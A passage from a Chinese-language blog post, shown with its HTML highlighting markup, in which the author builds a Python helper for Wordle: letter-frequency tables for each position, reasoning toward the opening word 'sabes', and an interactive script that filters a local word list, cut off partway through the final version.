位字母的数据</span><br><span class="line">请输入搜索的单词:<span class="selector-tag">3</span></span><br><span class="line">字母<span class="selector-tag">q</span>         <span class="selector-tag">3</span>次</span><br><span class="line">字母<span class="selector-tag">j</span>         <span class="selector-tag">5</span>次</span><br><span class="line">字母<span class="selector-tag">h</span>         <span class="selector-tag">19</span>次</span><br><span class="line">字母<span class="selector-tag">z</span>         <span class="selector-tag">28</span>次</span><br><span class="line">字母<span class="selector-tag">x</span>         <span class="selector-tag">30</span>次</span><br><span class="line">字母<span class="selector-tag">y</span>         <span class="selector-tag">37</span>次</span><br><span class="line">字母<span class="selector-tag">f</span>         <span class="selector-tag">39</span>次</span><br><span class="line">字母<span class="selector-tag">k</span>         <span class="selector-tag">43</span>次</span><br><span class="line">字母<span class="selector-tag">w</span>         <span class="selector-tag">57</span>次</span><br><span class="line">字母<span class="selector-tag">b</span>         <span class="selector-tag">80</span>次</span><br><span class="line">字母<span class="selector-tag">v</span>         <span class="selector-tag">94</span>次</span><br><span class="line">字母<span class="selector-tag">p</span>         <span class="selector-tag">97</span>次</span><br><span class="line">字母<span class="selector-tag">g</span>         <span class="selector-tag">106</span>次</span><br><span class="line">字母<span class="selector-tag">d</span>         <span class="selector-tag">115</span>次</span><br><span class="line">字母<span class="selector-tag">c</span>         <span class="selector-tag">123</span>次</span><br><span class="line">字母<span class="selector-tag">m</span>         <span class="selector-tag">125</span>次</span><br><span class="line">字母<span class="selector-tag">s</span>         <span class="selector-tag">177</span>次</span><br><span class="line">字母<span class="selector-tag">t</span>         <span class="selector-tag">193</span>次</span><br><span class="line">字母<span class="selector-tag">u</span>         <span class="selector-tag">241</span>次</span><br><span class="line">字母<span class="selector-tag">l</span>         <span class="selector-tag">266</span>次</span><br><span class="line">字母<span class="selector-tag">e</span>         <span class="selector-tag">306</span>次</span><br><span class="line">字母<span class="selector-tag">n</span>         <span class="selector-tag">307</span>次</span><br><span class="line">字母<span class="selector-tag">r</span>         <span class="selector-tag">336</span>次</span><br><span class="line">字母<span class="selector-tag">o</span>         <span class="selector-tag">359</span>次</span><br><span class="line">字母<span class="selector-tag">i</span>         <span class="selector-tag">418</span>次</span><br><span class="line">字母<span class="selector-tag">a</span>         <span class="selector-tag">486</span>次</span><br><span class="line">已统计第 <span class="selector-tag">3</span> 位字母的数据</span><br><span class="line">请输入搜索的单词:<span class="selector-tag">4</span></span><br><span class="line">字母<span class="selector-tag">x</span>         <span class="selector-tag">3</span>次</span><br><span class="line">字母<span class="selector-tag">j</span>         <span class="selector-tag">3</span>次</span><br><span class="line">字母<span class="selector-tag">y</span>         <span class="selector-tag">20</span>次</span><br><span class="line">字母<span class="selector-tag">z</span>         <span class="selector-tag">27</span>次</span><br><span class="line">字母<span class="selector-tag">b</span>         <span class="selector-tag">48</span>次</span><br><span class="line">字母<span class="selector-tag">w</span>         <span class="selector-tag">50</span>次</span><br><span class="line">字母<span class="selector-tag">f</span>         <span class="selector-tag">51</span>次</span><br><span class="line">字母<span class="selector-tag">h</span>         <span class="selector-tag">55</span>次</span><br><span class="line">字母<span class="selector-tag">v</span>         <span class="selector-tag">57</span>次</span><br><span class="line">字母<span class="selector-tag">u</span>         <span class="selector-tag">120</span>次</span><br><span class="line">字母<span class="selector-tag">p</span>         <span class="selector-tag">125</span>次</span><br><span class="line">字母<span class="selector-tag">m</span>         <span class="selector-tag">129</span>次</span><br><span class="line">字母<span class="selector-tag">g</span>         <span class="selector-tag">131</span>次</span><br><span class="line">字母<span class="selector-tag">k</span>         <span class="selector-tag">136</span>次</span><br><span class="line">字母<span class="selector-tag">d</span>         <span class="selector-tag">162</span>次</span><br><span class="line">字母<span class="selector-tag">o</span>         <span class="selector-tag">165</span>次</span><br><span class="line">字母<span class="selector-tag">c</span>         <span class="selector-tag">179</span>次</span><br><span class="line">字母<span class="selector-tag">i</span>         <span class="selector-tag">207</span>次</span><br><span class="line">字母<span class="selector-tag">a</span>         <span class="selector-tag">217</span>次</span><br><span class="line">字母<span class="selector-tag">s</span>         <span class="selector-tag">223</span>次</span><br><span class="line">字母<span class="selector-tag">r</span>         <span class="selector-tag">268</span>次</span><br><span class="line">字母<span class="selector-tag">l</span>         <span class="selector-tag">286</span>次</span><br><span class="line">字母<span class="selector-tag">n</span>         <span class="selector-tag">311</span>次</span><br><span class="line">字母<span class="selector-tag">t</span>         <span class="selector-tag">324</span>次</span><br><span class="line">字母<span class="selector-tag">e</span>         <span class="selector-tag">793</span>次</span><br><span class="line">已统计第 <span class="selector-tag">4</span> 位字母的数据</span><br><span class="line">请输入搜索的单词:<span class="selector-tag">5</span></span><br><span class="line">字母<span class="selector-tag">z</span>         <span class="selector-tag">5</span>次</span><br><span class="line">字母<span class="selector-tag">x</span>         <span class="selector-tag">12</span>次</span><br><span class="line">字母<span class="selector-tag">u</span>         <span class="selector-tag">12</span>次</span><br><span class="line">字母<span class="selector-tag">b</span>         <span class="selector-tag">14</span>次</span><br><span class="line">字母<span class="selector-tag">w</span>         <span class="selector-tag">22</span>次</span><br><span class="line">字母<span class="selector-tag">i</span>         <span class="selector-tag">28</span>次</span><br><span class="line">字母<span class="selector-tag">f</span>         <span class="selector-tag">31</span>次</span><br><span class="line">字母<span class="selector-tag">c</span>         <span class="selector-tag">34</span>次</span><br><span class="line">字母<span class="selector-tag">g</span>         <span class="selector-tag">47</span>次</span><br><span class="line">字母<span class="selector-tag">m</span>         <span class="selector-tag">51</span>次</span><br><span class="line">字母<span class="selector-tag">p</span>         <span class="selector-tag">60</span>次</span><br><span class="line">字母<span class="selector-tag">o</span>         <span class="selector-tag">96</span>次</span><br><span class="line">字母<span class="selector-tag">k</span>         <span class="selector-tag">119</span>次</span><br><span class="line">字母<span class="selector-tag">a</span>         <span class="selector-tag">124</span>次</span><br><span class="line">字母<span class="selector-tag">h</span>         <span class="selector-tag">158</span>次</span><br><span class="line">字母<span class="selector-tag">n</span>         <span class="selector-tag">167</span>次</span><br><span class="line">字母<span class="selector-tag">l</span>         <span class="selector-tag">178</span>次</span><br><span class="line">字母<span class="selector-tag">r</span>         <span class="selector-tag">265</span>次</span><br><span class="line">字母<span class="selector-tag">d</span>         <span class="selector-tag">291</span>次</span><br><span class="line">字母<span class="selector-tag">t</span>         <span class="selector-tag">322</span>次</span><br><span class="line">字母<span class="selector-tag">y</span>         <span class="selector-tag">403</span>次</span><br><span class="line">字母<span class="selector-tag">e</span>         <span class="selector-tag">618</span>次</span><br><span class="line">字母<span class="selector-tag">s</span>         <span class="selector-tag">1033</span>次</span><br><span class="line">已统计第 <span class="selector-tag">5</span> 位字母的数据</span><br></pre></td></tr></table></figure><p>最后想了想，干脆一鼓作气，把所有的数据统计出来然后实时推荐。</p><p><strong>思路如下：</strong></p><ol><li>易得：三个颜色中，绿色、黄色出现后，数据会剔除的特别快</li><li>意识到：<strong>白色最为让人无奈</strong></li><li>朴素地想到：实时统计<strong>valid_words.txt</strong>中第一位到哪个字母出现的最多，然后是第二位哪个字母最多…直到第五位。</li><li>在<strong>valid_words.txt</strong>中尝试找到一个尽可能包含以上五个字母的单词</li><li>如此一来，就算是最不期望的白色，同样也可以最大化剔除、净化数据</li></ol><p>用以上思路，借用上面的、还未有过任何输入的实验数据可得：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">字母s         563次</span><br><span class="line">已统计第<span class="number"> 1 </span>位字母的数据</span><br><span class="line"></span><br><span class="line">字母a         689次</span><br><span class="line">已统计第<span class="number"> 2 </span>位字母的数据</span><br><span class="line"></span><br><span class="line">字母a         486次</span><br><span class="line">已统计第<span class="number"> 3 </span>位字母的数据</span><br><span class="line"></span><br><span class="line">字母e         793次</span><br><span class="line">已统计第<span class="number"> 4 </span>位字母的数据</span><br><span class="line"></span><br><span class="line">字母s         1033次</span><br><span class="line">已统计第<span class="number"> 5 </span>位字母的数据</span><br></pre></td></tr></table></figure><p>在 <strong>valid_words.txt</strong>中，最有效用的开场单词可以是<strong>saaes</strong>，显然没有这个单词，但有<strong>sabes</strong>代替（事后发现sages也可</p><h4 id="sabes"><a href="#sabes" class="headerlink" title="sabes"></a>sabes</h4><p>花了些时间，改了下辅助脚本</p><p>事后看，问题很大，逻辑不够明晰，其中对“在<strong>valid_words.txt</strong>中尝试找到一个尽可能包含以上五个字母的单词”实现不够完美</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"># 统计第<span class="keyword">X</span>位哪个字母出现最多次</span><br><span class="line">def sum_l(site):</span><br><span class="line">    dict_letter = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> word in dat<span class="variable">a:</span></span><br><span class="line">        <span class="keyword">if</span> word[site - <span class="number">1</span>] in dict_letter:</span><br><span class="line">            dict_letter[word[site - <span class="number">1</span>]] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dict_letter[word[site - <span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line">    dict_letter.<span class="built_in">items</span>()  # 得到: dict_items([(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>)])</span><br><span class="line">    L = <span class="keyword">list</span>(dict_letter.<span class="built_in">items</span>())  # 得到列表: L=[(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>)]</span><br><span class="line">    L.<span class="keyword">sort</span>(key=lambda <span class="keyword">x</span>: <span class="keyword">x</span>[<span class="number">1</span>], <span class="built_in">reverse</span>=False)  # 按列表中，每一个元组的第二个元素从小到大排序。</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line">    # <span class="keyword">x</span>代表从L中遍历出的一个元组</span><br><span class="line">    # 得到:  [(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = <span class="keyword">open</span>(<span class="string">&#x27;./valid_words.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = data.<span class="keyword">read</span>().<span class="keyword">split</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">tmp = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> tmp != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">    tmp = <span class="built_in">input</span>(<span class="string">&quot;请输入搜索的单词:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> tmp == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;程序已关闭&quot;</span>)</span><br><span class="line">    elif <span class="string">&#x27;-&#x27;</span> in tmp:  # -<span class="keyword">o</span>[<span class="number">3</span>]</span><br><span class="line">        tmp = <span class="string">&#x27;&#x27;</span>.<span class="keyword">join</span>(tmp.<span class="keyword">split</span>(<span class="string">&#x27;-&#x27;</span>)).<span class="keyword">split</span>(<span class="string">&quot;[&quot;</span>)</span><br><span class="line">        # [<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;3]&#x27;</span>]</span><br><span class="line">        del_word = tmp[<span class="number">0</span>]</span><br><span class="line">        site = <span class="keyword">int</span>(tmp[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">        # <span class="keyword">print</span>(del_word, <span class="built_in">len</span>(del_word))</span><br><span class="line">        # <span class="keyword">print</span>(data)</span><br><span class="line">        data2 = []</span><br><span class="line">        <span class="keyword">for</span> word in dat<span class="variable">a:</span></span><br><span class="line">            <span class="keyword">if</span> word[site-<span class="number">1</span>] != del_word:</span><br><span class="line">                data2.<span class="keyword">append</span>(word)</span><br><span class="line">        data = data2</span><br><span class="line">        # <span class="keyword">print</span>(data)</span><br><span class="line">        <span class="keyword">for</span> i in dat<span class="variable">a:</span></span><br><span class="line">            <span class="keyword">print</span>(i)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.format(<span class="built_in">len</span>(data)))</span><br><span class="line">    elif <span class="string">&#x27;[&#x27;</span> in tmp:  # d[<span class="number">1</span>]</span><br><span class="line">        tmp = tmp.<span class="keyword">split</span>(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">        word = tmp[<span class="number">0</span>]  # d</span><br><span class="line">        <span class="keyword">print</span>(word)</span><br><span class="line">        <span class="keyword">print</span>(tmp)</span><br><span class="line">        site = tmp[<span class="number">1</span>][<span class="number">0</span>]  # <span class="number">1</span></span><br><span class="line">        data2 = []</span><br><span class="line">        <span class="keyword">for</span> i in dat<span class="variable">a:</span></span><br><span class="line">            <span class="keyword">if</span> i[<span class="keyword">int</span>(site) - <span class="number">1</span>] == word:</span><br><span class="line">                data2.<span class="keyword">append</span>(i)</span><br><span class="line">        data = data2</span><br><span class="line">        <span class="keyword">for</span> i in dat<span class="variable">a:</span></span><br><span class="line">            <span class="keyword">print</span>(i)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.format(<span class="built_in">len</span>(data)))</span><br><span class="line">    elif tmp.isdigit():</span><br><span class="line">        # <span class="number">1</span> -&gt; 统计所有单词第一位的数据</span><br><span class="line">        site = <span class="keyword">int</span>(tmp)</span><br><span class="line">        dict_letter = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> word in dat<span class="variable">a:</span></span><br><span class="line">            <span class="keyword">if</span> word[site -<span class="number">1</span>] in dict_letter:</span><br><span class="line">                dict_letter[word[site -<span class="number">1</span>]] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dict_letter[word[site -<span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line">        dict_letter.<span class="built_in">items</span>()  # 得到: dict_items([(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line">        L = <span class="keyword">list</span>(dict_letter.<span class="built_in">items</span>())  # 得到列表: L=[(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>)]</span><br><span class="line">        L.<span class="keyword">sort</span>(key=lambda <span class="keyword">x</span>: <span class="keyword">x</span>[<span class="number">1</span>], <span class="built_in">reverse</span>=False)  # 按列表中，每一个元组的第二个元素从小到大排序。</span><br><span class="line">        # <span class="keyword">x</span>代表从L中遍历出的一个元组</span><br><span class="line">        # 得到:  [(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>)]</span><br><span class="line">        <span class="keyword">for</span> i in L:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;字母&#123;0&#125;         &#123;1&#125;次&quot;</span>.format(i[<span class="number">0</span>], i[<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;已统计第 &#123;0&#125; 位字母的数据&quot;</span>.format(site))</span><br><span class="line"></span><br><span class="line">    # 用魔法来击败魔法</span><br><span class="line">    # 统计，自动推荐！</span><br><span class="line">    # L =  [(<span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>)]</span><br><span class="line">    elif tmp == <span class="string">&quot;get&quot;</span>:</span><br><span class="line">        def <span class="built_in">get</span>():</span><br><span class="line">            L1 = sum_l(<span class="number">1</span>)</span><br><span class="line">            L2 = sum_l(<span class="number">2</span>)</span><br><span class="line">            L3 = sum_l(<span class="number">3</span>)</span><br><span class="line">            L4 = sum_l(<span class="number">4</span>)</span><br><span class="line">            L5 = sum_l(<span class="number">5</span>)</span><br><span class="line">            L_list = [L1, L2, L3, L4, L5]</span><br><span class="line">            quanzhong = &#123;&#125;</span><br><span class="line">            site = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> L in L_lis<span class="variable">t:</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(L) == <span class="number">1</span>:  # 此位已确定，不予排序</span><br><span class="line">                    pass</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    quanzhong[L[-<span class="number">1</span>][<span class="number">0</span>]+str(site)] = L[-<span class="number">1</span>][-<span class="number">1</span>]  # 把每一位最大权重的字母加到列表中like： &#123;<span class="string">&quot;c1&quot;</span>: <span class="number">3</span>&#125; ；  <span class="string">&quot;1&quot;</span> 指代第一位</span><br><span class="line">                site += <span class="number">1</span></span><br><span class="line">            Q = <span class="keyword">list</span>(quanzhong.<span class="built_in">items</span>())</span><br><span class="line">            Q.<span class="keyword">sort</span>(key=lambda <span class="keyword">x</span>: <span class="keyword">x</span>[<span class="number">1</span>], <span class="built_in">reverse</span>=False)  # 按列表中，每一个元组的第二个元素从小到大排序。</span><br><span class="line">            <span class="keyword">print</span>(Q)</span><br><span class="line">            # 得到列表: Q=[(<span class="string">&#x27;a2&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;c3&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;b1&#x27;</span>, <span class="number">4</span>)]</span><br><span class="line">            data3 = []</span><br><span class="line"></span><br><span class="line">            # 找data有最高权重字母的</span><br><span class="line">            site = <span class="keyword">int</span>(Q[-<span class="number">1</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">            letter = Q[-<span class="number">1</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> word in dat<span class="variable">a:</span></span><br><span class="line">                <span class="keyword">if</span> word[site-<span class="number">1</span>] == letter:</span><br><span class="line">                    data3.<span class="keyword">append</span>(word)</span><br><span class="line">            <span class="keyword">print</span>(data3)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(Q) &gt; <span class="number">1</span>:</span><br><span class="line">                # 找data3有第二高权重字母的</span><br><span class="line">                site = <span class="keyword">int</span>(Q[-<span class="number">2</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">                letter = Q[-<span class="number">2</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                data4 = []</span><br><span class="line">                <span class="keyword">for</span> word in data3:</span><br><span class="line">                    <span class="keyword">if</span> word[site-<span class="number">1</span>] == letter:</span><br><span class="line">                        data4.<span class="keyword">append</span>(word)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(data4) == <span class="number">0</span>:  # 没有满足的，返回第一权重的词群</span><br><span class="line">                    <span class="keyword">print</span>(data3)</span><br><span class="line">                elif <span class="built_in">len</span>(Q) &gt; <span class="number">2</span>:  # 找data4有第三高权重字母的</span><br><span class="line">                    site = <span class="keyword">int</span>(Q[-<span class="number">3</span>][<span class="number">0</span>][-<span class="number">1</span>])</span><br><span class="line">                    letter = Q[-<span class="number">3</span>][<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">                    data5 = []</span><br><span class="line">                    <span class="keyword">for</span> word in data4:</span><br><span class="line">                        <span class="keyword">if</span> word[site-<span class="number">1</span>] == letter:</span><br><span class="line">                            data5.<span class="keyword">append</span>(word)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(data5) == <span class="number">0</span>:   # 没有满足的，返回第二权重的词群</span><br><span class="line">                        <span class="keyword">print</span>(data4)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">print</span>(data5)  # 返回第三权重词群</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span>(data3)  # 就只有一个权重，返回之</span><br><span class="line"></span><br><span class="line">        <span class="built_in">get</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        # 存在 s</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            data = <span class="keyword">open</span>(<span class="string">&#x27;./valid_words.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            data = data.<span class="keyword">read</span>().<span class="keyword">split</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        data1 = data</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i in data1:</span><br><span class="line">            <span class="keyword">if</span> tmp in i:</span><br><span class="line">                data.<span class="keyword">append</span>(i)</span><br><span class="line">        <span class="keyword">for</span> i in dat<span class="variable">a:</span></span><br><span class="line">            <span class="keyword">print</span>(i)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.format(<span class="built_in">len</span>(data)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># sabes  !!!</span><br></pre></td></tr></table></figure><h4 id="辅助脚本最终版"><a href="#辅助脚本最终版" class="headerlink" title="辅助脚本最终版"></a>辅助脚本最终版</h4><p>加了些注释，改了点小问题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 统计第X位哪个字母出现最多次</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum_l</span>(<span class="params">site</span>):</span></span><br><span class="line">    dict_letter = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> word[site - <span class="number">1</span>] <span class="keyword">in</span> dict_letter:</span><br><span class="line">            dict_letter[word[site - <span class="number">1</span>]] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dict_letter[word[site - <span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line">    dict_letter.items()  <span class="comment"># 得到: dict_items([(&#x27;a&#x27;, 1), (&#x27;c&#x27;, 3), (&#x27;b&#x27;, 2)])</span></span><br><span class="line">    L = <span 